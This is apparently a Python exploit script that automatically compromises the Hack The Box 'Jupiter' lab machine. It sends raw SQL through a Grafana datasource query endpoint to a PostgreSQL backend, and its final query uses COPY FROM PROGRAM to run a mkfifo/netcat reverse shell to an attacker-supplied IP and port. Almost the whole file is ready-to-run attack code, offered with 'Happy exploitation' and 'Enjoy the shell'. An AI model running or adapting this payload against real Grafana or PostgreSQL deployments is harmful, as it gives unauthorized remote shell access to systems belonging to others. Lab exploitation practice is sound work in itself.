import requests, random, string, sys
from json import dumps, loads
import pwn
from time import * 
#msg

print("""

*           *   *           *       *           *       *           *    *  
⠀⠀⠀*⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀*⠀⠀⠀⠀⠀*⠀⠀⠀⠀⠀⠀*⠀⠀⠀⠀  *           *                   *               *           *           *
⠀⠀⠀⠀*⠀⠀⠀⠀⣀⣤⣴⣶⣾⣿⣿⣿⣿⣷⡶⠦⠀⠀⠀⠀⠀⠀     *       *
⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣤⡄⠀⠀⠀⠀⠀⠀ *  *         *           +  *            *               *       * 
⠀⠀⠀⠀⣰⣿⣿⣿⠋⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⡟⠛⠛⠃⠀⠀⠀⠀⠀           
⠀⠀⠀⣼⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀      *           *   *           *       *           *       *           *    *  
⠀⠀⢰⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⠿⠟⠛⠁⠀⠀⠀⠀⠀*           *   *           *       *           *       *           *    *  
⠀⠀⣾⣿⣿⣿⣿⣿⣿⣶⣤⣤⣴⣾⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⠀⠀*           *   *           *       *           *       *           *    *  
⠀⠀⣉⠉⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠉⣉⠀⠀        *  *           *   *           *       *           *       *           *    *  
⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⠿⠿⠀⠀        *           *   *           *       *           *       *           *    *  
⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠛⠛⠋⠉⠀⠀⠀⠀*           *   *           *       *           *       *           *    *  
⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣤⡄⠀⠀⠀⠀    *           *   *           *       *           *       *           *    *  
⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀ *    *       *   *           *       *           *       *           *    *  
⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡄⠀⠀⠀⠀⠀⠀⠀⠀*           *   *           *       *           *       *           *    *  
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⠿⢿⣿⣿⣿⣿⠟⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀*   * *  *        *   *           *       *           *       *           *    *  
⠀                                        _______   _______      ___      .___________. __    __          _______..___________.     ___      .______      
                                        |       \ |   ____|    /   \     |           ||  |  |  |        /       ||           |    /   \     |   _  \     
                                        |  .--.  ||  |__      /  ^  \    `---|  |----`|  |__|  |       |   (----``---|  |----`   /  ^  \    |  |_)  |    
                                        |  |  |  ||   __|    /  /_\  \       |  |     |   __   |        \   \        |  |       /  /_\  \   |      /     
                                        |  '--'  ||  |____  /  _____  \      |  |     |  |  |  |    .----)   |       |  |      /  _____  \  |  |\  \----.
                                        |_______/ |_______|/__/     \__\     |__|     |__|  |__|    |_______/        |__|     /__/     \__\ | _| `._____|   
                                                                                                            HTB Jupiter Autopwn (No root for more fun)
Turn up your listener!




""")

# variables 
characters = string.ascii_letters + string.digits
shell_name = ''.join(random.choice(characters) for _ in range(10)) 

Headers = {

"x-dashboard-uid": "jMgFGfA4z",
"x-datasource-uid": "YItSLg-Vz",
"x-grafana-org-id": "1",
"x-panel-id": "24",
"x-plugin-id": "postgres",
"content-type": "application/json"
}

if len(sys.argv) != 3:    
         print(f'[*] Use: {sys.argv[0]} <attacker-ip> <attacker-port>')
         print(f'[*] Example:\n')
         print(f'\t$ python3 {sys.argv[0]} 10.4.37.100 443')
         print('\n~ Happy exploitation!')
         sys.exit(1)

attacker_ip = sys.argv[1]
attacker_port = sys.argv[2]
sleep(3)

url = 'http://kiosk.jupiter.htb/api/ds/query'
query = {"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":940}],"range":{"from":"2023-06-03T18:51:29.895Z","to":"2023-06-04T00:51:29.896Z","raw":{"from":"now-6h","to":"now"}},"from":"1685818289895","to":"1685839889896"}


#Requests

def Shoot():
    check_cmd_exec = query["queries"][0]["rawSql"] = "DROP TABLE IF EXISTS cmd_exec;"
    payload = {"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"{}".format(check_cmd_exec),"format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":940}],"range":{"from":"2023-06-03T18:51:29.895Z","to":"2023-06-04T00:51:29.896Z","raw":{"from":"now-6h","to":"now"}},"from":"1685818289895","to":"1685839889896"}
    payload_json = dumps(payload)
    request = requests.post(url, data=payload_json, headers=Headers)
    if request.status_code == 200: #drop table checked
        print('[+] cmd_exec dropped!')
        cmd_output = query["queries"][0]["rawSql"] = "CREATE TABLE cmd_exec(cmd_output text);"
        payload = {"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"{}".format(cmd_output),"format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":940}],"range":{"from":"2023-06-03T18:51:29.895Z","to":"2023-06-04T00:51:29.896Z","raw":{"from":"now-6h","to":"now"}},"from":"1685818289895","to":"1685839889896"}
        payload_json = dumps(payload)
        request_output = requests.post(url, data=payload_json, headers=Headers)
        if 'db query error: pq: relation \"cmd_exec\" already exists' not in request_output.text: #cmd output created
            print('[+] cmd_output created!')
            shell = f"COPY cmd_exec FROM PROGRAM 'rm /tmp/{shell_name};mkfifo /tmp/{shell_name};cat /tmp/{shell_name}|/bin/sh -i 2>&1|nc {attacker_ip} {attacker_port} >/tmp/{shell_name}';"
            print(f'[+] Shell maked with mkfifo on /tmp/{shell_name}')
            payload = {"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"{}".format(shell),"format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":940}],"range":{"from":"2023-06-03T18:51:29.895Z","to":"2023-06-04T00:51:29.896Z","raw":{"from":"now-6h","to":"now"}},"from":"1685818289895","to":"1685839889896"}
            payload_json = dumps(payload)
            print("[+] Enjoy the shell! @M4v3r1k") 
            request_output = requests.post(url, data=payload_json, headers=Headers) # request maked
        else:
            print("[!] Shell failed!")
    else:
        print("[!] Something happened. . . Quiting")
        sys.exit(2)

Shoot()
